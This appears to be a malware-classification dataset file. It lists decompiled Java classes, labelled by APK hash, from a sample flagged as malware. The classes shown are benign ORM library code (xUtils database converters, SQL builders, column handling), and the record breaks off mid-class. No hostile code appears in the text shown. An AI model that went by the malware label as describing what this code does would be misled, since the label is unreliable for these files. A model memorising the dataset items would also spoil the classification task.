"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.converter\SqlDateColumnConverter.code","public class SqlDateColumnConverter implements ColumnConverter<Date> {   @Override public Object fieldValue2ColumnValue(  Date date){     if (date == null) {       return null;     }     return Long.valueOf(date.getTime());   }   @Override public ColumnDbType getColumnDbType(){     return ColumnDbType.INTEGER;   }   @Override public Date getFieldValue(  Cursor cursor,  int i){     if (cursor.isNull(i)) {       return null;     }     return new Date(cursor.getLong(i));   }   @Override public Date getFieldValue(  String str){     if (TextUtils.isEmpty(str)) {       return null;     }     return new Date(Long.valueOf(str).longValue());   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.converter\StringColumnConverter.code","public class StringColumnConverter implements ColumnConverter<String> {   @Override public Object fieldValue2ColumnValue(  String str){     return str;   }   @Override public ColumnDbType getColumnDbType(){     return ColumnDbType.TEXT;   }   @Override public String getFieldValue(  Cursor cursor,  int i){     if (cursor.isNull(i)) {       return null;     }     return cursor.getString(i);   }   @Override public String getFieldValue(  String str){     return str;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.sqlite\CursorUtils.code","public class CursorUtils { class EntityTempCache {     private static final ConcurrentHashMap<String,Object> cache=new ConcurrentHashMap<>();     private static long seq=0;     private EntityTempCache(){     }     public static <T>T get(    Class<T> cls,    Object obj){       return (T)cache.get(cls.getName() + ""#"" + obj);     }     public static <T>void put(    Class<T> cls,    Object obj,    Object obj2){       cache.put(cls.getName() + ""#"" + obj,obj2);     }     public static void setSeq(    long j){       if (seq != j) {         cache.clear();         seq=j;       }     }   } public class FindCacheSequence {     private static long seq=0;     private static final String FOREIGN_LAZY_LOADER_CLASS_NAME=ForeignLazyLoader.class.getName();     private static final String FINDER_LAZY_LOADER_CLASS_NAME=FinderLazyLoader.class.getName();     private FindCacheSequence(){     }     public static long getSeq(){       String className=Thread.currentThread().getStackTrace()[4].getClassName();       if (!className.equals(FOREIGN_LAZY_LOADER_CLASS_NAME) && !className.equals(FINDER_LAZY_LOADER_CLASS_NAME)) {         seq++;       }       return seq;     }   }   public static DbModel getDbModel(  Cursor cursor){     DbModel dbModel=null;     if (cursor != null) {       dbModel=new DbModel();       int columnCount=cursor.getColumnCount();       for (int i=0; i < columnCount; i++) {         dbModel.add(cursor.getColumnName(i),cursor.getString(i));       }     }     return dbModel;   }   public static <T>T getEntity(  DbUtils dbUtils,  Cursor cursor,  Class<T> cls,  long j){     if (dbUtils == null || cursor == null) {       return null;     }     EntityTempCache.setSeq(j);     try {       Table table=Table.get(dbUtils,cls);       Id id=table.id;       String columnName=id.getColumnName();       int index=id.getIndex();       int columnIndex=index < 0 ? cursor.getColumnIndex(columnName) : index;       Object fieldValue=id.getColumnConverter().getFieldValue(cursor,columnIndex);       T t=(T)EntityTempCache.get(cls,fieldValue);       if (t != null) {         return t;       }       T newInstance=cls.newInstance();       id.setValue2Entity(newInstance,cursor,columnIndex);       EntityTempCache.put(cls,fieldValue,newInstance);       int columnCount=cursor.getColumnCount();       for (int i=0; i < columnCount; i++) {         Column column=table.columnMap.get(cursor.getColumnName(i));         if (column != null) {           column.setValue2Entity(newInstance,cursor,i);         }       }       Iterator<Finder> it=table.finderMap.values().iterator();       while (it.hasNext()) {         it.next().setValue2Entity(newInstance,null,0);       }       return newInstance;     }  catch (    Throwable th) {       LogUtils.e(th.getMessage(),th);       return null;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.sqlite\DbModelSelector.code","public class DbModelSelector {   private String[] columnExpressions;   private String groupByColumnName;   private WhereBuilder having;   private Selector selector;   public DbModelSelector(  Selector selector,  String str){     this.selector=selector;     this.groupByColumnName=str;   }   public DbModelSelector(  Selector selector,  String[] strArr){     this.selector=selector;     this.columnExpressions=strArr;   }   private DbModelSelector(  Class<?> cls){     this.selector=Selector.from(cls);   }   public static DbModelSelector from(  Class<?> cls){     return new DbModelSelector(cls);   }   public DbModelSelector and(  WhereBuilder whereBuilder){     this.selector.and(whereBuilder);     return this;   }   public DbModelSelector and(  String str,  String str2,  Object obj){     this.selector.and(str,str2,obj);     return this;   }   public DbModelSelector expr(  String str){     this.selector.expr(str);     return this;   }   public DbModelSelector expr(  String str,  String str2,  Object obj){     this.selector.expr(str,str2,obj);     return this;   }   public Class<?> getEntityType(){     return this.selector.getEntityType();   }   public DbModelSelector groupBy(  String str){     this.groupByColumnName=str;     return this;   }   public DbModelSelector having(  WhereBuilder whereBuilder){     this.having=whereBuilder;     return this;   }   public DbModelSelector limit(  int i){     this.selector.limit(i);     return this;   }   public DbModelSelector offset(  int i){     this.selector.offset(i);     return this;   }   public DbModelSelector or(  WhereBuilder whereBuilder){     this.selector.or(whereBuilder);     return this;   }   public DbModelSelector or(  String str,  String str2,  Object obj){     this.selector.or(str,str2,obj);     return this;   }   public DbModelSelector orderBy(  String str){     this.selector.orderBy(str);     return this;   }   public DbModelSelector orderBy(  String str,  boolean z){     this.selector.orderBy(str,z);     return this;   }   public DbModelSelector select(  String... strArr){     this.columnExpressions=strArr;     return this;   }   public String toString(){     StringBuffer stringBuffer=new StringBuffer();     stringBuffer.append(""SELECT "");     if (this.columnExpressions != null && this.columnExpressions.length > 0) {       for (int i=0; i < this.columnExpressions.length; i++) {         stringBuffer.append(this.columnExpressions[i]);         stringBuffer.append("","");       }       stringBuffer.deleteCharAt(stringBuffer.length() - 1);     }  else     if (TextUtils.isEmpty(this.groupByColumnName)) {       stringBuffer.append(""*"");     }  else {       stringBuffer.append(this.groupByColumnName);     }     stringBuffer.append("" FROM "").append(this.selector.tableName);     if (this.selector.whereBuilder != null && this.selector.whereBuilder.getWhereItemSize() > 0) {       stringBuffer.append("" WHERE "").append(this.selector.whereBuilder.toString());     }     if (!TextUtils.isEmpty(this.groupByColumnName)) {       stringBuffer.append("" GROUP BY "").append(this.groupByColumnName);       if (this.having != null && this.having.getWhereItemSize() > 0) {         stringBuffer.append("" HAVING "").append(this.having.toString());       }     }     if (this.selector.orderByList != null) {       for (int i2=0; i2 < this.selector.orderByList.size(); i2++) {         stringBuffer.append("" ORDER BY "").append(this.selector.orderByList.get(i2).toString());       }     }     if (this.selector.limit > 0) {       stringBuffer.append("" LIMIT "").append(this.selector.limit);       stringBuffer.append("" OFFSET "").append(this.selector.offset);     }     return stringBuffer.toString();   }   public DbModelSelector where(  WhereBuilder whereBuilder){     this.selector.where(whereBuilder);     return this;   }   public DbModelSelector where(  String str,  String str2,  Object obj){     this.selector.where(str,str2,obj);     return this;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.sqlite\EntityTempCache.code","class EntityTempCache {   private static final ConcurrentHashMap<String,Object> cache=new ConcurrentHashMap<>();   private static long seq=0;   private EntityTempCache(){   }   public static <T>T get(  Class<T> cls,  Object obj){     return (T)cache.get(cls.getName() + ""#"" + obj);   }   public static <T>void put(  Class<T> cls,  Object obj,  Object obj2){     cache.put(cls.getName() + ""#"" + obj,obj2);   }   public static void setSeq(  long j){     if (seq != j) {       cache.clear();       seq=j;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.sqlite\FindCacheSequence.code","public class FindCacheSequence {   private static long seq=0;   private static final String FOREIGN_LAZY_LOADER_CLASS_NAME=ForeignLazyLoader.class.getName();   private static final String FINDER_LAZY_LOADER_CLASS_NAME=FinderLazyLoader.class.getName();   private FindCacheSequence(){   }   public static long getSeq(){     String className=Thread.currentThread().getStackTrace()[4].getClassName();     if (!className.equals(FOREIGN_LAZY_LOADER_CLASS_NAME) && !className.equals(FINDER_LAZY_LOADER_CLASS_NAME)) {       seq++;     }     return seq;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.sqlite\FinderLazyLoader.code","public class FinderLazyLoader<T> {   private final Finder finderColumn;   private final Object finderValue;   public FinderLazyLoader(  Finder finder,  Object obj){     this.finderColumn=finder;     this.finderValue=ColumnUtils.convert2DbColumnValueIfNeeded(obj);   }   public List<T> getAllFromDb(){     Table table=this.finderColumn.getTable();     if (table != null) {       return table.db.findAll(Selector.from(this.finderColumn.getTargetEntityType()).where(this.finderColumn.getTargetColumnName(),""="",this.finderValue));     }     return null;   }   public T getFirstFromDb(){     Table table=this.finderColumn.getTable();     if (table != null) {       return (T)table.db.findFirst(Selector.from(this.finderColumn.getTargetEntityType()).where(this.finderColumn.getTargetColumnName(),""="",this.finderValue));     }     return null;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.sqlite\ForeignLazyLoader.code","public class ForeignLazyLoader<T> {   private Object columnValue;   private final Foreign foreignColumn;   public ForeignLazyLoader(  Foreign foreign,  Object obj){     this.foreignColumn=foreign;     this.columnValue=ColumnUtils.convert2DbColumnValueIfNeeded(obj);   }   public List<T> getAllFromDb(){     Table table=this.foreignColumn.getTable();     if (table != null) {       return table.db.findAll(Selector.from(this.foreignColumn.getForeignEntityType()).where(this.foreignColumn.getForeignColumnName(),""="",this.columnValue));     }     return null;   }   public Object getColumnValue(){     return this.columnValue;   }   public T getFirstFromDb(){     Table table=this.foreignColumn.getTable();     if (table != null) {       return (T)table.db.findFirst(Selector.from(this.foreignColumn.getForeignEntityType()).where(this.foreignColumn.getForeignColumnName(),""="",this.columnValue));     }     return null;   }   public void setColumnValue(  Object obj){     this.columnValue=ColumnUtils.convert2DbColumnValueIfNeeded(obj);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.sqlite\OrderBy.code","public class OrderBy {   private String columnName;   private boolean desc;   public OrderBy(  String str){     this.columnName=str;   }   public OrderBy(  String str,  boolean z){     this.columnName=str;     this.desc=z;   }   public String toString(){     return this.columnName + (this.desc ? "" DESC"" : "" ASC"");   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.sqlite\Selector.code","public class Selector {   protected Class<?> entityType;   protected int limit=0;   protected int offset=0;   protected List<OrderBy> orderByList;   protected String tableName;   protected WhereBuilder whereBuilder; public class OrderBy {     private String columnName;     private boolean desc;     public OrderBy(    String str){       this.columnName=str;     }     public OrderBy(    String str,    boolean z){       this.columnName=str;       this.desc=z;     }     public String toString(){       return this.columnName + (this.desc ? "" DESC"" : "" ASC"");     }   }   private Selector(  Class<?> cls){     this.entityType=cls;     this.tableName=TableUtils.getTableName(cls);   }   public static Selector from(  Class<?> cls){     return new Selector(cls);   }   public Selector and(  WhereBuilder whereBuilder){     this.whereBuilder.expr(""AND ("" + whereBuilder.toString() + "")"");     return this;   }   public Selector and(  String str,  String str2,  Object obj){     this.whereBuilder.and(str,str2,obj);     return this;   }   public Selector expr(  String str){     if (this.whereBuilder == null) {       this.whereBuilder=WhereBuilder.b();     }     this.whereBuilder.expr(str);     return this;   }   public Selector expr(  String str,  String str2,  Object obj){     if (this.whereBuilder == null) {       this.whereBuilder=WhereBuilder.b();     }     this.whereBuilder.expr(str,str2,obj);     return this;   }   public Class<?> getEntityType(){     return this.entityType;   }   public DbModelSelector groupBy(  String str){     return new DbModelSelector(this,str);   }   public Selector limit(  int i){     this.limit=i;     return this;   }   public Selector offset(  int i){     this.offset=i;     return this;   }   public Selector or(  WhereBuilder whereBuilder){     this.whereBuilder.expr(""OR ("" + whereBuilder.toString() + "")"");     return this;   }   public Selector or(  String str,  String str2,  Object obj){     this.whereBuilder.or(str,str2,obj);     return this;   }   public Selector orderBy(  String str){     if (this.orderByList == null) {       this.orderByList=new ArrayList(2);     }     this.orderByList.add(new OrderBy(str));     return this;   }   public Selector orderBy(  String str,  boolean z){     if (this.orderByList == null) {       this.orderByList=new ArrayList(2);     }     this.orderByList.add(new OrderBy(str,z));     return this;   }   public DbModelSelector select(  String... strArr){     return new DbModelSelector(this,strArr);   }   public String toString(){     StringBuilder sb=new StringBuilder();     sb.append(""SELECT "");     sb.append(""*"");     sb.append("" FROM "").append(this.tableName);     if (this.whereBuilder != null && this.whereBuilder.getWhereItemSize() > 0) {       sb.append("" WHERE "").append(this.whereBuilder.toString());     }     if (this.orderByList != null) {       int i=0;       while (true) {         int i2=i;         if (i2 >= this.orderByList.size()) {           break;         }         sb.append("" ORDER BY "").append(this.orderByList.get(i2).toString());         i=i2 + 1;       }     }     if (this.limit > 0) {       sb.append("" LIMIT "").append(this.limit);       sb.append("" OFFSET "").append(this.offset);     }     return sb.toString();   }   public Selector where(  WhereBuilder whereBuilder){     this.whereBuilder=whereBuilder;     return this;   }   public Selector where(  String str,  String str2,  Object obj){     this.whereBuilder=WhereBuilder.b(str,str2,obj);     return this;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.sqlite\SqlInfo.code","public class SqlInfo {   private LinkedList<Object> bindArgs;   private String sql;   public SqlInfo(){   }   public SqlInfo(  String str){     this.sql=str;   }   public SqlInfo(  String str,  Object... objArr){     this.sql=str;     addBindArgs(objArr);   }   public void addBindArg(  Object obj){     if (this.bindArgs == null) {       this.bindArgs=new LinkedList<>();     }     this.bindArgs.add(ColumnUtils.convert2DbColumnValueIfNeeded(obj));   }   public void addBindArgWithoutConverter(  Object obj){     if (this.bindArgs == null) {       this.bindArgs=new LinkedList<>();     }     this.bindArgs.add(obj);   }   public void addBindArgs(  Object... objArr){     if (objArr != null) {       for (      Object obj : objArr) {         addBindArg(obj);       }     }   }   public LinkedList<Object> getBindArgs(){     return this.bindArgs;   }   public Object[] getBindArgsAsArray(){     if (this.bindArgs != null) {       return this.bindArgs.toArray();     }     return null;   }   public String[] getBindArgsAsStrArray(){     if (this.bindArgs == null) {       return null;     }     String[] strArr=new String[this.bindArgs.size()];     for (int i=0; i < this.bindArgs.size(); i++) {       Object obj=this.bindArgs.get(i);       strArr[i]=obj == null ? null : obj.toString();     }     return strArr;   }   public String getSql(){     return this.sql;   }   public void setSql(  String str){     this.sql=str;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.sqlite\SqlInfoBuilder.code","public class SqlInfoBuilder {   private SqlInfoBuilder(){   }   public static SqlInfo buildCreateTableSqlInfo(  DbUtils dbUtils,  Class<?> cls){     Table table=Table.get(dbUtils,cls);     Id id=table.id;     StringBuffer stringBuffer=new StringBuffer();     stringBuffer.append(""CREATE TABLE IF NOT EXISTS "");     stringBuffer.append(table.tableName);     stringBuffer.append("" ( "");     if (id.isAutoIncrement()) {       stringBuffer.append(""\"""").append(id.getColumnName()).append(""\""  "").append(""INTEGER PRIMARY KEY AUTOINCREMENT,"");     }  else {       stringBuffer.append(""\"""").append(id.getColumnName()).append(""\""  "").append(id.getColumnDbType()).append("" PRIMARY KEY,"");     }     for (    Column column : table.columnMap.values()) {       if (!(column instanceof Finder)) {         stringBuffer.append(""\"""").append(column.getColumnName()).append(""\""  "");         stringBuffer.append(column.getColumnDbType());         if (ColumnUtils.isUnique(column.getColumnField())) {           stringBuffer.append("" UNIQUE"");         }         if (ColumnUtils.isNotNull(column.getColumnField())) {           stringBuffer.append("" NOT NULL"");         }         String check=ColumnUtils.getCheck(column.getColumnField());         if (check != null) {           stringBuffer.append("" CHECK("").append(check).append("")"");         }         stringBuffer.append("","");       }     }     stringBuffer.deleteCharAt(stringBuffer.length() - 1);     stringBuffer.append("" )"");     return new SqlInfo(stringBuffer.toString());   }   private static String buildDeleteSqlByTableName(  String str){     return ""DELETE FROM "" + str;   }   public static SqlInfo buildDeleteSqlInfo(  DbUtils dbUtils,  Class<?> cls,  WhereBuilder whereBuilder){     StringBuilder sb=new StringBuilder(buildDeleteSqlByTableName(Table.get(dbUtils,cls).tableName));     if (whereBuilder != null && whereBuilder.getWhereItemSize() > 0) {       sb.append("" WHERE "").append(whereBuilder.toString());     }     return new SqlInfo(sb.toString());   }   public static SqlInfo buildDeleteSqlInfo(  DbUtils dbUtils,  Class<?> cls,  Object obj){     SqlInfo sqlInfo=new SqlInfo();     Table table=Table.get(dbUtils,cls);     Id id=table.id;     if (obj == null) {       throw new DbException(""this entity["" + cls + ""]'s id value is null"");     }     StringBuilder sb=new StringBuilder(buildDeleteSqlByTableName(table.tableName));     sb.append("" WHERE "").append(WhereBuilder.b(id.getColumnName(),""="",obj));     sqlInfo.setSql(sb.toString());     return sqlInfo;   }   public static SqlInfo buildDeleteSqlInfo(  DbUtils dbUtils,  Object obj){     SqlInfo sqlInfo=new SqlInfo();     Table table=Table.get(dbUtils,obj.getClass());     Id id=table.id;     Object columnValue=id.getColumnValue(obj);     if (columnValue == null) {       throw new DbException(""this entity["" + obj.getClass() + ""]'s id value is null"");     }     StringBuilder sb=new StringBuilder(buildDeleteSqlByTableName(table.tableName));     sb.append("" WHERE "").append(WhereBuilder.b(id.getColumnName(),""="",columnValue));     sqlInfo.setSql(sb.toString());     return sqlInfo;   }   public static SqlInfo buildInsertSqlInfo(  DbUtils dbUtils,  Object obj){     List<KeyValue> entity2KeyValueList=entity2KeyValueList(dbUtils,obj);     if (entity2KeyValueList.size() == 0) {       return null;     }     SqlInfo sqlInfo=new SqlInfo();     StringBuffer stringBuffer=new StringBuffer();     stringBuffer.append(""INSERT INTO "");     stringBuffer.append(TableUtils.getTableName(obj.getClass()));     stringBuffer.append("" ("");     for (    KeyValue keyValue : entity2KeyValueList) {       stringBuffer.append(keyValue.key).append("","");       sqlInfo.addBindArgWithoutConverter(keyValue.value);     }     stringBuffer.deleteCharAt(stringBuffer.length() - 1);     stringBuffer.append("") VALUES ("");     int size=entity2KeyValueList.size();     for (int i=0; i < size; i++) {       stringBuffer.append(""?,"");     }     stringBuffer.deleteCharAt(stringBuffer.length() - 1);     stringBuffer.append("")"");     sqlInfo.setSql(stringBuffer.toString());     return sqlInfo;   }   public static SqlInfo buildReplaceSqlInfo(  DbUtils dbUtils,  Object obj){     List<KeyValue> entity2KeyValueList=entity2KeyValueList(dbUtils,obj);     if (entity2KeyValueList.size() == 0) {       return null;     }     SqlInfo sqlInfo=new SqlInfo();     StringBuffer stringBuffer=new StringBuffer();     stringBuffer.append(""REPLACE INTO "");     stringBuffer.append(TableUtils.getTableName(obj.getClass()));     stringBuffer.append("" ("");     for (    KeyValue keyValue : entity2KeyValueList) {       stringBuffer.append(keyValue.key).append("","");       sqlInfo.addBindArgWithoutConverter(keyValue.value);     }     stringBuffer.deleteCharAt(stringBuffer.length() - 1);     stringBuffer.append("") VALUES ("");     int size=entity2KeyValueList.size();     for (int i=0; i < size; i++) {       stringBuffer.append(""?,"");     }     stringBuffer.deleteCharAt(stringBuffer.length() - 1);     stringBuffer.append("")"");     sqlInfo.setSql(stringBuffer.toString());     return sqlInfo;   }   public static SqlInfo buildUpdateSqlInfo(  DbUtils dbUtils,  Object obj,  WhereBuilder whereBuilder,  String... strArr){     HashSet hashSet;     List<KeyValue> entity2KeyValueList=entity2KeyValueList(dbUtils,obj);     if (entity2KeyValueList.size() == 0) {       return null;     }     if (strArr == null || strArr.length <= 0) {       hashSet=null;     }  else {       HashSet hashSet2=new HashSet(strArr.length);       Collections.addAll(hashSet2,strArr);       hashSet=hashSet2;     }     String tableName=TableUtils.getTableName(obj.getClass());     SqlInfo sqlInfo=new SqlInfo();     StringBuffer stringBuffer=new StringBuffer(""UPDATE "");     stringBuffer.append(tableName);     stringBuffer.append("" SET "");     for (    KeyValue keyValue : entity2KeyValueList) {       if (hashSet == null || hashSet.contains(keyValue.key)) {         stringBuffer.append(keyValue.key).append(""=?,"");         sqlInfo.addBindArgWithoutConverter(keyValue.value);       }     }     stringBuffer.deleteCharAt(stringBuffer.length() - 1);     if (whereBuilder != null && whereBuilder.getWhereItemSize() > 0) {       stringBuffer.append("" WHERE "").append(whereBuilder.toString());     }     sqlInfo.setSql(stringBuffer.toString());     return sqlInfo;   }   public static SqlInfo buildUpdateSqlInfo(  DbUtils dbUtils,  Object obj,  String... strArr){     HashSet hashSet;     List<KeyValue> entity2KeyValueList=entity2KeyValueList(dbUtils,obj);     if (entity2KeyValueList.size() == 0) {       return null;     }     if (strArr == null || strArr.length <= 0) {       hashSet=null;     }  else {       HashSet hashSet2=new HashSet(strArr.length);       Collections.addAll(hashSet2,strArr);       hashSet=hashSet2;     }     Table table=Table.get(dbUtils,obj.getClass());     Id id=table.id;     Object columnValue=id.getColumnValue(obj);     if (columnValue == null) {       throw new DbException(""this entity["" + obj.getClass() + ""]'s id value is null"");     }     SqlInfo sqlInfo=new SqlInfo();     StringBuffer stringBuffer=new StringBuffer(""UPDATE "");     stringBuffer.append(table.tableName);     stringBuffer.append("" SET "");     for (    KeyValue keyValue : entity2KeyValueList) {       if (hashSet == null || hashSet.contains(keyValue.key)) {         stringBuffer.append(keyValue.key).append(""=?,"");         sqlInfo.addBindArgWithoutConverter(keyValue.value);       }     }     stringBuffer.deleteCharAt(stringBuffer.length() - 1);     stringBuffer.append("" WHERE "").append(WhereBuilder.b(id.getColumnName(),""="",columnValue));     sqlInfo.setSql(stringBuffer.toString());     return sqlInfo;   }   private static KeyValue column2KeyValue(  Object obj,  Column column){     String columnName=column.getColumnName();     if (columnName == null) {       return null;     }     Object columnValue=column.getColumnValue(obj);     if (columnValue == null) {       columnValue=column.getDefaultValue();     }     return new KeyValue(columnName,columnValue);   }   public static List<KeyValue> entity2KeyValueList(  DbUtils dbUtils,  Object obj){     KeyValue column2KeyValue;     ArrayList arrayList=new ArrayList();     Table table=Table.get(dbUtils,obj.getClass());     Id id=table.id;     if (!id.isAutoIncrement()) {       arrayList.add(new KeyValue(id.getColumnName(),id.getColumnValue(obj)));     }     for (    Column column : table.columnMap.values()) {       if (!(column instanceof Finder) && (column2KeyValue=column2KeyValue(obj,column)) != null) {         arrayList.add(column2KeyValue);       }     }     return arrayList;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.sqlite\WhereBuilder.code","public class WhereBuilder {   private final List<String> whereItems=new ArrayList();   private WhereBuilder(){   }   private void appendCondition(  String str,  String str2,  String str3,  Object obj){     Iterable iterable;     Iterable iterable2;     int i=0;     StringBuilder sb=new StringBuilder();     if (this.whereItems.size() > 0) {       sb.append("" "");     }     if (!TextUtils.isEmpty(str)) {       sb.append(str + "" "");     }     sb.append(str2);     if (""!="".equals(str3)) {       str3=""<>"";     }  else     if (""=="".equals(str3)) {       str3=""="";     }     if (obj != null) {       sb.append("" "" + str3 + "" "");       if (""IN"".equalsIgnoreCase(str3)) {         if (obj instanceof Iterable) {           iterable2=(Iterable)obj;         }  else         if (obj.getClass().isArray()) {           ArrayList arrayList=new ArrayList();           int length=Array.getLength(obj);           while (i < length) {             arrayList.add(Array.get(obj,i));             i++;           }           iterable2=arrayList;         }  else {           iterable2=null;         }         if (iterable2 == null) {           throw new IllegalArgumentException(""value must be an Array or an Iterable."");         }         StringBuffer stringBuffer=new StringBuffer(""("");         Iterator it=iterable2.iterator();         while (it.hasNext()) {           Object convert2DbColumnValueIfNeeded=ColumnUtils.convert2DbColumnValueIfNeeded(it.next());           if (ColumnDbType.TEXT.equals(ColumnConverterFactory.getDbColumnType(convert2DbColumnValueIfNeeded.getClass()))) {             String obj2=convert2DbColumnValueIfNeeded.toString();             if (obj2.indexOf(39) != -1) {               obj2=obj2.replace(""'"",""''"");             }             stringBuffer.append(""'"" + obj2 + ""'"");           }  else {             stringBuffer.append(convert2DbColumnValueIfNeeded);           }           stringBuffer.append("","");         }         stringBuffer.deleteCharAt(stringBuffer.length() - 1);         stringBuffer.append("")"");         sb.append(stringBuffer.toString());       }  else       if (""BETWEEN"".equalsIgnoreCase(str3)) {         if (obj instanceof Iterable) {           iterable=(Iterable)obj;         }  else         if (obj.getClass().isArray()) {           ArrayList arrayList2=new ArrayList();           int length2=Array.getLength(obj);           while (i < length2) {             arrayList2.add(Array.get(obj,i));             i++;           }           iterable=arrayList2;         }  else {           iterable=null;         }         if (iterable == null) {           throw new IllegalArgumentException(""value must be an Array or an Iterable."");         }         Iterator it2=iterable.iterator();         if (!it2.hasNext()) {           throw new IllegalArgumentException(""value must have tow items."");         }         Object next=it2.next();         if (!it2.hasNext()) {           throw new IllegalArgumentException(""value must have tow items."");         }         Object next2=it2.next();         Object convert2DbColumnValueIfNeeded2=ColumnUtils.convert2DbColumnValueIfNeeded(next);         Object convert2DbColumnValueIfNeeded3=ColumnUtils.convert2DbColumnValueIfNeeded(next2);         if (ColumnDbType.TEXT.equals(ColumnConverterFactory.getDbColumnType(convert2DbColumnValueIfNeeded2.getClass()))) {           String obj3=convert2DbColumnValueIfNeeded2.toString();           if (obj3.indexOf(39) != -1) {             obj3=obj3.replace(""'"",""''"");           }           String obj4=convert2DbColumnValueIfNeeded3.toString();           if (obj4.indexOf(39) != -1) {             obj4=obj4.replace(""'"",""''"");           }           sb.append(""'"" + obj3 + ""'"");           sb.append("" AND "");           sb.append(""'"" + obj4 + ""'"");         }  else {           sb.append(convert2DbColumnValueIfNeeded2);           sb.append("" AND "");           sb.append(convert2DbColumnValueIfNeeded3);         }       }  else {         Object convert2DbColumnValueIfNeeded4=ColumnUtils.convert2DbColumnValueIfNeeded(obj);         if (ColumnDbType.TEXT.equals(ColumnConverterFactory.getDbColumnType(convert2DbColumnValueIfNeeded4.getClass()))) {           String obj5=convert2DbColumnValueIfNeeded4.toString();           if (obj5.indexOf(39) != -1) {             obj5=obj5.replace(""'"",""''"");           }           sb.append(""'"" + obj5 + ""'"");         }  else {           sb.append(convert2DbColumnValueIfNeeded4);         }       }     }  else     if (""="".equals(str3)) {       sb.append("" IS NULL"");     }  else     if (""<>"".equals(str3)) {       sb.append("" IS NOT NULL"");     }  else {       sb.append("" "" + str3 + "" NULL"");     }     this.whereItems.add(sb.toString());   }   public static WhereBuilder b(){     return new WhereBuilder();   }   public static WhereBuilder b(  String str,  String str2,  Object obj){     WhereBuilder whereBuilder=new WhereBuilder();     whereBuilder.appendCondition(null,str,str2,obj);     return whereBuilder;   }   public WhereBuilder and(  String str,  String str2,  Object obj){     appendCondition(this.whereItems.size() == 0 ? null : ""AND"",str,str2,obj);     return this;   }   public WhereBuilder expr(  String str){     this.whereItems.add("" "" + str);     return this;   }   public WhereBuilder expr(  String str,  String str2,  Object obj){     appendCondition(null,str,str2,obj);     return this;   }   public int getWhereItemSize(){     return this.whereItems.size();   }   public WhereBuilder or(  String str,  String str2,  Object obj){     appendCondition(this.whereItems.size() == 0 ? null : ""OR"",str,str2,obj);     return this;   }   public String toString(){     if (this.whereItems.size() == 0) {       return """";     }     StringBuilder sb=new StringBuilder();     Iterator<String> it=this.whereItems.iterator();     while (it.hasNext()) {       sb.append(it.next());     }     return sb.toString();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.db.table\Column.code","public class Column {   protected final ColumnConverter columnConverter;   protected final Field columnField;   protected final String columnName;   private final Object defaultValue;   protected final Method getMethod;   private int index=-1;   protected final Method setMethod;   private Table table;   public Column(  Class<?> cls,  Field field){     this.columnField=field;     this.columnConverter=ColumnConverterFactory.getColumnConverter(field.getType());     this.columnName=ColumnUtils.getColumnNameByField(field);     if (this.columnConverter != null) {       this.defaultValue=this.columnConverter.getFieldValue(ColumnUtils.getColumnDefaultValue(field));     }  else {       this.defaultValue=null;     }     this.getMethod=ColumnUtils.getColumnGetMethod(cls,field);     this.setMethod=ColumnUtils.getColumnSetMethod(cls,field);   }   public ColumnConverter getColumnConverter(){     return this.columnConverter;   }   public ColumnDbType getColumnDbType(){     return this.columnConverter.getColumnDbType();   }   public Field getColumnField(){     return this.columnField;   }   public String getColumnName(){     return this.columnName;   }   public Object getColumnValue(  Object obj){     return this.columnConverter.fieldValue2ColumnValue(getFieldValue(obj));   }   public Object getDefaultValue(){     return this.defaultValue;   }   public Object getFieldValue(  Object obj){     if (obj == null) {       return null;     }     if (this.getMethod != null) {       try {         return this.getMethod.invoke(obj,new Object[0]);       }  catch (      Throwable th) {         LogUtils.e(th.getMessage(),th);         return null;       }     }     try {       this.columnField.setAccessible(true);       return this.columnField.get(obj);     }  catch (    Throwable th2) {       LogUtils.e(th2.getMessage(),th2);       return null;     }   }   public int getIndex(){     return this.index;   }   public Table getTable(){     return this.table;   }   public void setTable(  Table table){     this.table=table;   }   public void setValue2Entity(  Object obj,  Cursor cursor,  int i){     this.index=i;     Object fieldValue=this.columnConverter.getFieldValue(cursor,i);     if (fieldValue == null && this.defaultValue == null) {       return;     }     if (this.setMethod == null) {       try {         this.columnField.setAccessible(true);         Field field=this.columnField;         if (fieldValue == null) {           fieldValue=this.defaultValue;         }         field.set(obj,fieldValue);         return;       }  catch (      Throwable th) {         LogUtils.e(th.getMessage(),th);     